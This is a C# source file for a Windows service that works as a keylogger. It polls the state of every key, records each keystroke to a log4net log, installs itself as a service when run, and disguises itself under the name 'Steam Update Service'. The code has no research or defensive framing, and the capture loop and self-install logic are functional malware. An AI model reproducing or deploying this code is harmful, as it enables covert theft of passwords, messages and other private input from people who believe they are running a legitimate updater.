﻿using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Reflection;
using System.Configuration.Install;
using System.Linq;
using System.Threading;
using System.Collections;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Runtime.InteropServices;

[assembly: log4net.Config.XmlConfigurator(Watch = true)]

namespace WindowsService
{
    class WindowsService : ServiceBase
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); 


        public static readonly string Name = "Steam Update Service";
        private static readonly log4net.ILog log = log4net.LogManager.GetLogger(typeof(WindowsService));

        private static Thread thread;
        private static Queue keystrokeBuf;
        private static bool awaitingMsg;
        private static bool calledUpdate;
        private static Dictionary<Int32,short> prevVk;

        /// <summary>
        /// Public Constructor for WindowsService.
        /// - Put all of your Initialization code here.
        /// </summary>
        public WindowsService()
        {
            this.ServiceName = Name;
            this.EventLog.Log = "Application";

            // These Flags set whether or not to handle that specific
            //  type of event. Set to true if you need it, false otherwise.
            this.CanHandlePowerEvent = true;
            this.CanHandleSessionChangeEvent = true;
            this.CanPauseAndContinue = true;
            this.CanShutdown = true;
            this.CanStop = true;
        }

        /// <summary>
        /// The Main Thread: This is where your Service is Run.
        /// </summary>
        static void Main()
        {
            if (Environment.UserInteractive)
            {
                ServiceController sc = ServiceController.GetServices()
                    .FirstOrDefault(x => x.ServiceName == Name);

                bool amInstalled = (sc != null);

                if (amInstalled && sc.Status == ServiceControllerStatus.Stopped)
                {
                    using (ServiceController sc2 = new ServiceController(WindowsService.Name))
                    {
                        sc2.Start();
                    }
                }
                else if (!amInstalled)
                {
                    ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
                }

                awaitingMsg = false;
                prevVk = new Dictionary<Int32,short>();
                keystrokeBuf = new Queue();

                thread = new Thread(new ThreadStart(Update));
                thread.Start();
            }
            else
            {
                ServiceBase.Run(new WindowsService());
            }
        }

        public static void PushMessage(string msg)
        {
            lock (keystrokeBuf.SyncRoot)
            {
                keystrokeBuf.Enqueue(msg);
            }
        }

        private static void CheckKeys()
        {
            bool found = false;
            foreach (Int32 k in Enum.GetValues(typeof(Keys)))
            {
                short state = GetAsyncKeyState(k);
                if (state == 1 || state == Int16.MinValue)
                {
                    if ((Keys)k != Keys.LButton && (Keys)k != Keys.RButton)
                    {
                        if (!prevVk.ContainsKey(k))
                        {
                            prevVk.Add(k, state);
                        }
                        if (prevVk[k] == 0)
                        {
                            PushMessage(Enum.GetName(typeof(Keys), k));
                            found = true;
                        }
                    }
                    
                }
                else
                {
                    if (!prevVk.ContainsKey(k))
                        prevVk.Add(k, 0);
                    else
                        prevVk[k] = 0;
                }
            }

            if (found)
                awaitingMsg = true;
        }

        private static void Update()
        {
            while (true)
            {
                CheckKeys();

                if (awaitingMsg == true)
                {
                    lock (keystrokeBuf.SyncRoot)
                    {
                        while (keystrokeBuf.Count > 0)
                        {
                            log.Info(keystrokeBuf.Dequeue());
                        }
                        awaitingMsg = false;
                    }
                }
            }
        }

        /// <summary>
        /// Dispose of objects that need it here.
        /// </summary>
        /// <param name="disposing">Whether
        ///    or not disposing is going on.</param>
        protected override void Dispose(bool disposing)
        {
            base.Dispose(disposing);
        }

        /// <summary>
        /// OnStart(): Put startup code here
        ///  - Start threads, get inital data, etc.
        /// </summary>
        /// <param name="args"></param>
        protected override void OnStart(string[] args)
        {
            //awaitingMsg = false;
            //keystrokeBuf = new Queue();

            //thread = new Thread(new ThreadStart(Update));
            //thread.Start();

            base.OnStart(args);
        }

        /// <summary>
        /// OnStop(): Put your stop code here
        /// - Stop threads, set final data, etc.
        /// </summary>
        protected override void OnStop()
        {
            base.OnStop();
        }

        /// <summary>
        /// OnPause: Put your pause code here
        /// - Pause working threads, etc.
        /// </summary>
        protected override void OnPause()
        {
            base.OnPause();
        }

        /// <summary>
        /// OnContinue(): Put your continue code here
        /// - Un-pause working threads, etc.
        /// </summary>
        protected override void OnContinue()
        {
            base.OnContinue();
        }

        /// <summary>
        /// OnShutdown(): Called when the System is shutting down
        /// - Put code here when you need special handling
        ///   of code that deals with a system shutdown, such
        ///   as saving special data before shutdown.
        /// </summary>
        protected override void OnShutdown()
        {
            base.OnShutdown();
        }

        /// <summary>
        /// OnCustomCommand(): If you need to send a command to your
        ///   service without the need for Remoting or Sockets, use
        ///   this method to do custom methods.
        /// </summary>
        /// <param name="command">Arbitrary Integer between 128 & 256</param>
        protected override void OnCustomCommand(int command)
        {
            //  A custom command can be sent to a service by using this method:
            //#  int command = 128; //Some Arbitrary number between 128 & 256
            //#  ServiceController sc = new ServiceController("NameOfService");
            //#  sc.ExecuteCommand(command);

            base.OnCustomCommand(command);
        }

        /// <summary>
        /// OnPowerEvent(): Useful for detecting power status changes,
        ///   such as going into Suspend mode or Low Battery for laptops.
        /// </summary>
        /// <param name="powerStatus">The Power Broadcast Status
        /// (BatteryLow, Suspend, etc.)</param>
        protected override bool OnPowerEvent(PowerBroadcastStatus powerStatus)
        {
            return base.OnPowerEvent(powerStatus);
        }

        /// <summary>
        /// OnSessionChange(): To handle a change event
        ///   from a Terminal Server session.
        ///   Useful if you need to determine
        ///   when a user logs in remotely or logs off,
        ///   or when someone logs into the console.
        /// </summary>
        /// <param name="changeDescription">The Session Change
        /// Event that occured.</param>
        protected override void OnSessionChange(
                  SessionChangeDescription changeDescription)
        {
            base.OnSessionChange(changeDescription);
        }
    }
}